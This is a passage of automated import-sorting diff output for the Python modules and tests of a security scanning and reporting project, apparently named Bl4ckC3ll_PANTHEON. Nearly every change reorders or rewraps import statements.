time\n-import tempfile\n-import os\n from pathlib import Path\n-import sys\n \n # Add the main directory to Python path\n sys.path.insert(0, str(Path(__file__).parent))\n@@ -197,6 +197,7 @@\n         \"\"\"Test enhanced wordlist integration with main script\"\"\"\n         try:\n             import enhanced_wordlists\n+\n             # Test that we can generate wordlists\n             generator = enhanced_wordlists.EnhancedWordlistGenerator()\n             tech_wordlists = generator.generate_technology_specific_wordlists()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/demo_enhanced_reporting.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/demo_enhanced_reporting.py:after\t2025-09-14 19:23:18.496028\n@@ -7,10 +7,10 @@\n \"\"\"\n \n import json\n+import sys\n import tempfile\n+from datetime import datetime\n from pathlib import Path\n-from datetime import datetime\n-import sys\n \n # Add current directory to path for imports\n sys.path.insert(0, str(Path(__file__).parent))\n@@ -197,9 +197,10 @@\n     \n     try:\n         # Import required components\n+        import logging\n+\n         from enhanced_report_controller import EnhancedReportController\n-        import logging\n-        \n+\n         # Set up logging\n         logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n         logger = logging.getLogger(\"demo\")\n@@ -331,7 +332,8 @@\n             \n             # Generate HTML report\n             try:\n-                from bl4ckc3ll_p4nth30n import generate_enhanced_intelligent_html_report\n+                from bl4ckc3ll_p4nth30n import \\\n+                    generate_enhanced_intelligent_html_report\n                 generate_enhanced_intelligent_html_report(enhanced_report, report_dir)\n                 html_file = report_dir / \"intelligent_report.html\"\n                 \n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_utils.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_utils.py:after\t2025-09-14 19:23:18.503292\n@@ -4,14 +4,14 @@\n Provides secure input handling, validation, and sanitization functions\n \"\"\"\n \n+import html\n+import ipaddress\n import re\n-import html\n+import socket\n import urllib.parse\n-from typing import List, Set, Dict, Any, Optional, Union\n from pathlib import Path\n-import ipaddress\n-import socket\n-from urllib.parse import urlparse, quote, unquote\n+from typing import Any, Dict, List, Optional, Set, Union\n+from urllib.parse import quote, unquote, urlparse\n \n \n class InputSanitizer:\n@@ -501,8 +501,8 @@\n             max_requests: Maximum requests allowed in time window\n             time_window: Time window in seconds\n         \"\"\"\n+        import collections\n         import time\n-        import collections\n         \n         self.max_requests = max_requests\n         self.time_window = time_window\n@@ -629,7 +629,7 @@\n     import datetime\n     import getpass\n     import socket\n-    \n+\n     # Validate inputs\n     operation = InputSanitizer.sanitize_parameter(operation) or \"unknown\"\n     target = InputSanitizer.sanitize_domain(target) or \"unknown\"\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_enhanced_reporting.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_enhanced_reporting.py:after\t2025-09-14 19:23:18.514412\n@@ -4,13 +4,13 @@\n Tests the new deep thinking and intelligent processing capabilities\n \"\"\"\n \n+import json\n+import logging\n+import shutil\n+import sys\n+import tempfile\n import unittest\n-import json\n-import tempfile\n-import shutil\n from pathlib import Path\n-import sys\n-import logging\n \n # Add the main directory to Python path\n sys.path.insert(0, str(Path(__file__).parent))\n@@ -149,7 +149,8 @@\n     def test_advanced_risk_calculator(self):\n         \"\"\"Test advanced risk calculation\"\"\"\n         try:\n-            from intelligent_report_engine import AdvancedRiskCalculator, IntelligentReportAnalyzer\n+            from intelligent_report_engine import (AdvancedRiskCalculator,\n+                                                   IntelligentReportAnalyzer)\n             \n             analyzer = IntelligentReportAnalyzer(self.test_config)\n             enhanced_vulns = analyzer.analyze_vulnerability_intelligence(self.sample_vulns)\n@@ -177,7 +178,8 @@\n     def test_vulnerability_correlation_engine(self):\n         \"\"\"Test vulnerability correlation analysis\"\"\"\n         try:\n-            from intelligent_report_engine import VulnerabilityCorrelationEngine, IntelligentReportAnalyzer\n+            from intelligent_report_engine import (\n+                IntelligentReportAnalyzer, VulnerabilityCorrelationEngine)\n             \n             analyzer = IntelligentReportAnalyzer(self.test_config)\n             enhanced_vulns = analyzer.analyze_vulnerability_intelligence(self.sample_vulns)\n@@ -205,7 +207,8 @@\n     def test_threat_intelligence_aggregator(self):\n         \"\"\"Test threat intelligence aggregation\"\"\"\n         try:\n-            from intelligent_report_engine import ThreatIntelligenceAggregator, IntelligentReportAnalyzer\n+            from intelligent_report_engine import (\n+                IntelligentReportAnalyzer, ThreatIntelligenceAggregator)\n             \n             analyzer = IntelligentReportAnalyzer(self.test_config)\n             enhanced_vulns = analyzer.analyze_vulnerability_intelligence(self.sample_vulns)\n@@ -232,7 +235,7 @@\n         \"\"\"Test enhanced report controller integration\"\"\"\n         try:\n             from enhanced_report_controller import EnhancedReportController\n-            \n+\n             # Create logger for testing\n             logger = logging.getLogger(\"test_logger\")\n             \n@@ -272,8 +275,9 @@\n         \"\"\"Test enhanced HTML report generation\"\"\"\n         try:\n             # Test the HTML report generation function\n-            from bl4ckc3ll_p4nth30n import generate_enhanced_intelligent_html_report\n-            \n+            from bl4ckc3ll_p4nth30n import \\\n+                generate_enhanced_intelligent_html_report\n+\n             # Create sample enhanced report data\n             enhanced_report_data = {\n                 \"report_metadata\": {\n@@ -412,7 +416,7 @@\n         try:\n             # Test that enhanced reporting can be imported and configured\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Check default configuration includes enhanced reporting\n             cfg = main.DEFAULT_CFG\n             self.assertIn(\"enhanced_reporting\", cfg)\n@@ -438,7 +442,7 @@\n         \"\"\"Test performance and error handling\"\"\"\n         try:\n             from intelligent_report_engine import IntelligentReportAnalyzer\n-            \n+\n             # Test with empty data\n             analyzer = IntelligentReportAnalyzer(self.test_config)\n             empty_result = analyzer.analyze_vulnerability_intelligence([])\n@@ -466,8 +470,9 @@\n     def test_executive_narrative_generation(self):\n         \"\"\"Test executive narrative generation\"\"\"\n         try:\n+            import logging\n+\n             from enhanced_report_controller import EnhancedReportController\n-            import logging\n             \n             config = {\n                 \"enhanced_reporting\": {\n@@ -488,8 +493,9 @@\n     def test_business_impact_calculation(self):\n         \"\"\"Test business impact calculation\"\"\"\n         try:\n-            from intelligent_report_engine import AdvancedRiskCalculator, BusinessContext\n-            \n+            from intelligent_report_engine import (AdvancedRiskCalculator,\n+                                                   BusinessContext)\n+\n             # Create business context with specific values\n             business_context = BusinessContext(\n                 asset_criticality=9.0,\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanner.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanner.py:after\t2025-09-14 19:23:18.516278\n@@ -5,15 +5,10 @@\n \"\"\"\n \n # Import all public components from enhanced_scanning\n-from enhanced_scanning import (\n-    AdaptiveScanManager,\n-    EnhancedScanner,\n-    ScanResult,\n-    PerformanceMetrics,\n-    get_current_success_rate,\n-    get_performance_report,\n-    run_enhanced_scanning\n-)\n+from enhanced_scanning import (AdaptiveScanManager, EnhancedScanner,\n+                               PerformanceMetrics, ScanResult,\n+                               get_current_success_rate,\n+                               get_performance_report, run_enhanced_scanning)\n \n # Make them available for direct import\n __all__ = [\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_orchestrator.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_orchestrator.py:after\t2025-09-14 19:23:18.524270\n@@ -4,37 +4,40 @@\n Orchestrates all enhancement modules to achieve and maintain 96%+ success rate\n \"\"\"\n \n+import json\n+import logging\n import os\n-import json\n+import threading\n import time\n-import threading\n+from dataclasses import dataclass, field\n+from datetime import datetime, timedelta\n from pathlib import Path\n-from datetime import datetime, timedelta\n-from typing import Dict, List, Any, Optional, Tuple\n-from dataclasses import dataclass, field\n-import logging\n+from typing import Any, Dict, List, Optional, Tuple\n \n # Enhanced modules imports with fallbacks\n try:\n-    from enhanced_scanning import adaptive_scan_manager, get_current_success_rate\n+    from enhanced_scanning import (adaptive_scan_manager,\n+                                   get_current_success_rate)\n     ENHANCED_SCANNING_AVAILABLE = True\n except ImportError:\n     ENHANCED_SCANNING_AVAILABLE = False\n \n try:\n-    from enhanced_tool_manager import tool_manager, get_tool_coverage_report\n+    from enhanced_tool_manager import get_tool_coverage_report, tool_manager\n     ENHANCED_TOOL_MANAGER_AVAILABLE = True\n except ImportError:\n     ENHANCED_TOOL_MANAGER_AVAILABLE = False\n \n try:\n-    from enhanced_validation import reliability_tracker, get_system_reliability_score\n+    from enhanced_validation import (get_system_reliability_score,\n+                                     reliability_tracker)\n     ENHANCED_VALIDATION_AVAILABLE = True\n except ImportError:\n     ENHANCED_VALIDATION_AVAILABLE = False\n \n try:\n-    from performance_monitor import performance_monitor, get_current_performance_metrics\n+    from performance_monitor import (get_current_performance_metrics,\n+                                     performance_monitor)\n     PERFORMANCE_MONITOR_AVAILABLE = True\n except ImportError:\n     PERFORMANCE_MONITOR_AVAILABLE = False\n@@ -445,7 +448,7 @@\n         \"\"\"Optimize resource usage\"\"\"\n         try:\n             import psutil\n-            \n+\n             # Check current resource usage\n             cpu_percent = psutil.cpu_percent(interval=1)\n             memory_percent = psutil.virtual_memory().percent\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_report_controller.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_report_controller.py:after\t2025-09-14 19:23:18.541408\n@@ -9,15 +9,16 @@\n import json\n import logging\n import statistics\n+from dataclasses import asdict\n from datetime import datetime, timedelta\n from pathlib import Path\n-from typing import Dict, List, Any, Optional, Tuple\n-from dataclasses import asdict\n+from typing import Any, Dict, List, Optional, Tuple\n \n-from intelligent_report_engine import (\n-    IntelligentReportAnalyzer, AdvancedRiskCalculator, VulnerabilityCorrelationEngine,\n-    ThreatIntelligenceAggregator, VulnerabilityContext, BusinessContext, ThreatLevel\n-)\n+from intelligent_report_engine import (AdvancedRiskCalculator, BusinessContext,\n+                                       IntelligentReportAnalyzer,\n+                                       ThreatIntelligenceAggregator,\n+                                       ThreatLevel, VulnerabilityContext,\n+                                       VulnerabilityCorrelationEngine)\n \n \n class EnhancedReportController:\n@@ -1238,4 +1239,4 @@\n \n \n # Import defaultdict for the code\n-from collections import defaultdict+from collections import defaultdict\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_pantheon_master.py:before\t2025-09-14 19:10:58.549754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_pantheon_master.py:after\t2025-09-14 19:23:18.566927\n@@ -28,33 +28,33 @@\n - Plugin system and extensible architecture\n \"\"\"\n \n+import asyncio\n+import base64\n+import html\n+import importlib.util\n+import ipaddress\n+import json\n+import logging\n import os\n+import platform\n+import re\n+import shutil\n+import socket\n+import ssl\n+import subprocess\n import sys\n-import json\n+import tempfile\n+import threading\n import time\n-import threading\n-import subprocess\n-import platform\n-import tempfile\n-import shutil\n+import urllib.parse\n import uuid\n import webbrowser\n-import logging\n-import asyncio\n-import socket\n-import ssl\n-import base64\n-import re\n-import html\n-import urllib.parse\n-import ipaddress\n+from concurrent.futures import ThreadPoolExecutor, as_completed\n+from dataclasses import asdict, dataclass\n+from datetime import datetime, timedelta, timezone\n from pathlib import Path\n-from datetime import datetime, timedelta, timezone\n-from typing import Dict, List, Any, Optional, Tuple, Set, Union\n-from concurrent.futures import ThreadPoolExecutor, as_completed\n-from urllib.parse import urlparse, urljoin, quote, unquote\n-from dataclasses import dataclass, asdict\n-import importlib.util\n+from typing import Any, Dict, List, Optional, Set, Tuple, Union\n+from urllib.parse import quote, unquote, urljoin, urlparse\n \n # Advanced imports for enhanced functionality\n try:\n@@ -70,15 +70,16 @@\n     HAS_PSUTIL = False\n \n try:\n+    from textual import on\n     from textual.app import App, ComposeResult\n-    from textual.containers import Container, Horizontal, Vertical, ScrollableContainer\n-    from textual.widgets import (\n-        Header, Footer, Static, Button, Label, Input, DataTable, \n-        TextArea, ProgressBar, Log, Select, Checkbox, Tree, TabbedContent, TabPane\n-    )\n     from textual.binding import Binding\n+    from textual.containers import (Container, Horizontal, ScrollableContainer,\n+                                    Vertical)\n     from textual.reactive import reactive\n-    from textual import on\n+    from textual.widgets import (Button, Checkbox, DataTable, Footer, Header,\n+                                 Input, Label, Log, ProgressBar, Select,\n+                                 Static, TabbedContent, TabPane, TextArea,\n+                                 Tree)\n     HAS_TEXTUAL = True\n except ImportError:\n     HAS_TEXTUAL = False\n@@ -461,7 +462,7 @@\n         import requests\n         from requests.adapters import HTTPAdapter\n         from requests.packages.urllib3.util.retry import Retry\n-        \n+\n         # Configure retry strategy\n         retry_strategy = Retry(\n             total=retries,\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/comprehensive_test_suite.py:before\t2025-09-14 19:10:58.549754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/comprehensive_test_suite.py:after\t2025-09-14 19:23:18.579376\n@@ -4,18 +4,18 @@\n Tests all functions, features, edge cases, and security controls\n \"\"\"\n \n+import json\n+import logging\n+import os\n+import subprocess\n import sys\n-import os\n-import json\n import tempfile\n+import threading\n import time\n-import threading\n-import subprocess\n import traceback\n-import logging\n+from datetime import datetime\n from pathlib import Path\n-from typing import Dict, List, Any\n-from datetime import datetime\n+from typing import Any, Dict, List\n \n # Add current directory to path\n sys.path.insert(0, str(Path(__file__).parent))\n@@ -73,7 +73,7 @@\n         \n         try:\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Test configuration loading\n             cfg = main.load_cfg()\n             self.log_test(\"Configuration Loading\", \"PASS\", f\"Loaded {len(cfg)} sections\")\n@@ -101,7 +101,7 @@\n         \n         try:\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Test domain validation\n             test_cases = [\n                 (\"google.com\", True),\n@@ -151,7 +151,7 @@\n         print(\"-\" * 50)\n         \n         try:\n-            from error_handler import ErrorRecoveryManager, EnhancedLogger\n+            from error_handler import EnhancedLogger, ErrorRecoveryManager\n             \n             logger = EnhancedLogger(\"test\")\n             recovery = ErrorRecoveryManager(logger)\n@@ -201,8 +201,9 @@\n         print(\"-\" * 50)\n         \n         try:\n-            from security_utils import InputValidator, NetworkValidator, RateLimiter\n-            \n+            from security_utils import (InputValidator, NetworkValidator,\n+                                        RateLimiter)\n+\n             # Test input sanitization\n             validator = InputValidator()\n             \n@@ -262,7 +263,7 @@\n         \n         try:\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Test certificate transparency search\n             ct_results = main.search_certificate_transparency(\"github.com\")\n             self.log_test(\"Certificate Transparency\", \"PASS\" if ct_results and len(ct_results) > 0 else \"FAIL\",\n@@ -317,8 +318,9 @@\n         \n         try:\n             import psutil\n-            import bl4ckc3ll_p4nth30n as main\n-            \n+\n+            import bl4ckc3ll_p4nth30n as main\n+\n             # Test system monitoring\n             initial_memory = psutil.Process().memory_info().rss\n             \n@@ -347,7 +349,7 @@\n         \n         try:\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Test with empty/invalid inputs\n             edge_cases = [\n                 (\"\", \"empty string\"),\n@@ -384,8 +386,9 @@\n         print(\"-\" * 50)\n         \n         try:\n-            import bl4ckc3ll_p4nth30n as main\n             import threading\n+\n+            import bl4ckc3ll_p4nth30n as main\n             \n             results = []\n             errors = []\n@@ -424,7 +427,7 @@\n         \n         try:\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Benchmark configuration loading\n             start_time = time.time()\n             for i in range(10):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/quick_functional_test.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/quick_functional_test.py:after\t2025-09-14 19:23:18.583490\n@@ -6,6 +6,7 @@\n \n import sys\n from pathlib import Path\n+\n \n def test_config_validator():\n     \"\"\"Test config validator functionality\"\"\"\n@@ -49,8 +50,9 @@\n     print(\"\ud83d\udd0d Testing Enhanced Scanner...\")\n     \n     try:\n-        from enhanced_scanner import AdaptiveScanManager, EnhancedScanner, get_current_success_rate\n-        \n+        from enhanced_scanner import (AdaptiveScanManager, EnhancedScanner,\n+                                      get_current_success_rate)\n+\n         # Test imports work\n         print(\"   \u2705 Module imports successful\")\n         \n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_validation.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_validation.py:after\t2025-09-14 19:23:18.589448\n@@ -4,23 +4,26 @@\n Provides comprehensive input validation, result verification, and reliability tracking\n \"\"\"\n \n+import hashlib\n+import ipaddress\n+import json\n import re\n-import json\n import time\n-import hashlib\n-from pathlib import Path\n-from typing import Dict, List, Any, Optional, Tuple, Set\n from dataclasses import dataclass, field\n from datetime import datetime, timedelta\n-import ipaddress\n+from pathlib import Path\n+from typing import Any, Dict, List, Optional, Set, Tuple\n from urllib.parse import urlparse\n+\n try:\n     import dns.resolver\n     DNS_AVAILABLE = True\n except ImportError:\n     DNS_AVAILABLE = False\n+from collections import Counter, defaultdict\n+\n import requests\n-from collections import defaultdict, Counter\n+\n \n @dataclass\n class ValidationResult:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanning.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanning.py:after\t2025-09-14 19:23:18.598248\n@@ -4,17 +4,17 @@\n Provides adaptive scanning capabilities with success rate tracking and optimization\n \"\"\"\n \n+import json\n+import logging\n import os\n+import statistics\n+import threading\n import time\n-import json\n-import threading\n-import statistics\n-from pathlib import Path\n-from datetime import datetime, timedelta\n-from typing import Dict, List, Any, Optional, Tuple\n from collections import defaultdict, deque\n from dataclasses import dataclass, field\n-import logging\n+from datetime import datetime, timedelta\n+from pathlib import Path\n+from typing import Any, Dict, List, Optional, Tuple\n \n # Enhanced modules integration\n try:\n@@ -27,15 +27,14 @@\n \n # Import main components - using try/except for graceful fallback\n try:\n-    from bl4ckc3ll_p4nth30n import (\n-        safe_run_command, which, atomic_write, read_lines,\n-        PantheonLogger, validate_domain_input, validate_ip_input,\n-        rate_limiter\n-    )\n+    from bl4ckc3ll_p4nth30n import (PantheonLogger, atomic_write, rate_limiter,\n+                                    read_lines, safe_run_command,\n+                                    validate_domain_input, validate_ip_input,\n+                                    which)\n except ImportError:\n     # Fallback implementations for testing\n+    import shutil\n     import subprocess\n-    import shutil\n     \n     def safe_run_command(cmd, timeout=60):\n         try:\n@@ -429,7 +428,7 @@\n         try:\n             # Import fallback scanner\n             from fallback_scanner import run_fallback_scan\n-            \n+\n             # Run fallback scan\n             success, findings_count = run_fallback_scan(targets, output_dir)\n             \n@@ -587,9 +586,9 @@\n     Returns:\n         Dictionary with scan results and performance metrics\n     \"\"\"\n+    import tempfile\n     from pathlib import Path\n-    import tempfile\n-    \n+\n     # Use temporary directory for output if not specified\n     output_dir = Path(tempfile.mkdtemp(prefix=\"enhanced_scan_\"))\n     \n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/diagnostics.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/diagnostics.py:after\t2025-09-14 19:23:18.602764\n@@ -4,12 +4,13 @@\n Provides detailed system and installation diagnostics\n \"\"\"\n \n-import sys\n import os\n+import platform\n import shutil\n import subprocess\n-import platform\n+import sys\n from pathlib import Path\n+\n \n def print_header(title):\n     print(f\"\\n{'='*50}\")\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_monitor.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_monitor.py:after\t2025-09-14 19:23:18.604951\n@@ -5,11 +5,13 @@\n \"\"\"\n \n import logging\n+import re\n import time\n-import re\n from pathlib import Path\n+\n+from watchdog.events import FileSystemEventHandler\n from watchdog.observers import Observer\n-from watchdog.events import FileSystemEventHandler\n+\n \n class SecurityMonitor(FileSystemEventHandler):\n     \"\"\"Monitor for security events\"\"\"\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/error_handler.py:before\t2025-09-14 19:10:58.551754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/error_handler.py:after\t2025-09-14 19:23:18.611647\n@@ -4,15 +4,15 @@\n Provides structured error handling, logging, and recovery mechanisms\n \"\"\"\n \n+import functools\n+import json\n+import logging\n+import re\n import sys\n import traceback\n-import functools\n-import logging\n-import re\n+from datetime import datetime\n from pathlib import Path\n from typing import Any, Callable, Dict, Optional, TypeVar, Union\n-from datetime import datetime\n-import json\n \n # Type variable for decorated functions\n F = TypeVar('F', bound=Callable[..., Any])\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/intelligent_report_engine.py:before\t2025-09-14 19:10:58.551754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/intelligent_report_engine.py:after\t2025-09-14 19:23:18.625566\n@@ -6,17 +6,17 @@\n Author: @cxb3rf1lth\n \"\"\"\n \n+import hashlib\n import json\n import logging\n-import hashlib\n+import re\n import statistics\n+from collections import Counter, defaultdict\n+from dataclasses import asdict, dataclass\n from datetime import datetime, timedelta\n+from enum import Enum\n from pathlib import Path\n-from typing import Dict, List, Any, Optional, Tuple, Set\n-from collections import defaultdict, Counter\n-from dataclasses import dataclass, asdict\n-from enum import Enum\n-import re\n+from typing import Any, Dict, List, Optional, Set, Tuple\n \n \n class ThreatLevel(Enum):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_optimizer.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_optimizer.py:after\t2025-09-14 19:23:18.630824\n@@ -4,11 +4,12 @@\n Final optimizations to reach 96% success rate target\n \"\"\"\n \n+import json\n+import logging\n import os\n-import json\n from pathlib import Path\n-from typing import Dict, List, Any\n-import logging\n+from typing import Any, Dict, List\n+\n \n def optimize_tool_coverage() -> Dict[str, Any]:\n     \"\"\"Optimize tool coverage by implementing virtual tools and fallbacks\"\"\"\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/master_workflow_automation.py:before\t2025-09-14 19:22:47.223448\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/master_workflow_automation.py:after\t2025-09-14 19:23:18.638599\n@@ -4,15 +4,16 @@\n Orchestrates all workflow components for 100% automated repository management\n \"\"\"\n \n+import argparse\n+import json\n+import os\n+import subprocess\n import sys\n-import subprocess\n-import json\n import time\n-import os\n+from datetime import datetime\n from pathlib import Path\n-from typing import Dict, List, Any\n-from datetime import datetime\n-import argparse\n+from typing import Any, Dict, List\n+\n \n class MasterWorkflowAutomation:\n     def __init__(self):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_debugger.py:before\t2025-09-14 19:20:22.080107\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_debugger.py:after\t2025-09-14 19:23:18.645305\n@@ -5,18 +5,19 @@\n \"\"\"\n \n import ast\n+import json\n+import logging\n+import os\n+import re\n+import subprocess\n import sys\n-import os\n-import json\n import time\n import traceback\n-import subprocess\n-import re\n+from collections import defaultdict\n+from dataclasses import dataclass\n from pathlib import Path\n-from typing import Dict, List, Any, Tuple, Optional\n-import logging\n-from dataclasses import dataclass\n-from collections import defaultdict\n+from typing import Any, Dict, List, Optional, Tuple\n+\n \n @dataclass\n class ErrorPattern:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/comprehensive_test_framework.py:before\t2025-09-14 19:19:07.727871\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/comprehensive_test_framework.py:after\t2025-09-14 19:23:18.651577\n@@ -4,20 +4,22 @@\n Provides 100% line-by-line coverage testing and automated debugging\n \"\"\"\n \n+import ast\n+import importlib.util\n+import inspect\n+import json\n+import os\n+import subprocess\n+import sys\n+import time\n+import traceback\n import unittest\n+from io import StringIO\n+from pathlib import Path\n+from typing import Any, Dict, List, Tuple\n+\n import coverage\n-import sys\n-import os\n-import json\n-import time\n-import subprocess\n-import ast\n-import inspect\n-from pathlib import Path\n-from typing import Dict, List, Any, Tuple\n-import importlib.util\n-import traceback\n-from io import StringIO\n+\n \n class ComprehensiveTestFramework:\n     def __init__(self):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/performance_tester.py:before\t2025-09-14 19:15:57.642991\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/performance_tester.py:after\t2025-09-14 19:23:18.654734\n@@ -4,14 +4,16 @@\n Runs performance benchmarks and validates performance requirements\n \"\"\"\n \n+import json\n+import statistics\n+import subprocess\n+import sys\n import time\n-import sys\n+from pathlib import Path\n+from typing import Any, Dict, List\n+\n import psutil\n-import json\n-import subprocess\n-from pathlib import Path\n-from typing import Dict, List, Any\n-import statistics\n+\n \n class PerformanceTester:\n     def __init__(self):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_repo_manager.py:before\t2025-09-14 19:21:57.115351\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_repo_manager.py:after\t2025-09-14 19:23:18.660293\n@@ -5,14 +5,16 @@\n \"\"\"\n \n import json\n+import os\n import subprocess\n import sys\n import time\n-import os\n+from datetime import datetime, timedelta\n from pathlib import Path\n-from typing import Dict, List, Any\n+from typing import Any, Dict, List\n+\n import requests\n-from datetime import datetime, timedelta\n+\n \n class IntelligentRepoManager:\n     def __init__(self):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/security_validator.py:before\t2025-09-14 19:15:06.527645\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/security_validator.py:after\t2025-09-14 19:23:18.663441\n@@ -5,12 +5,14 @@\n \"\"\"\n \n import json\n+import os\n+import re\n+import sys\n+from pathlib import Path\n+from typing import Any, Dict, List\n+\n import yaml\n-import sys\n-import os\n-from pathlib import Path\n-from typing import Dict, List, Any\n-import re\n+\n \n class SecurityValidator:\n     def __init__(self):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/docs_validator.py:before\t2025-09-14 19:15:30.168821\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/docs_validator.py:after\t2025-09-14 19:23:18.665785\n@@ 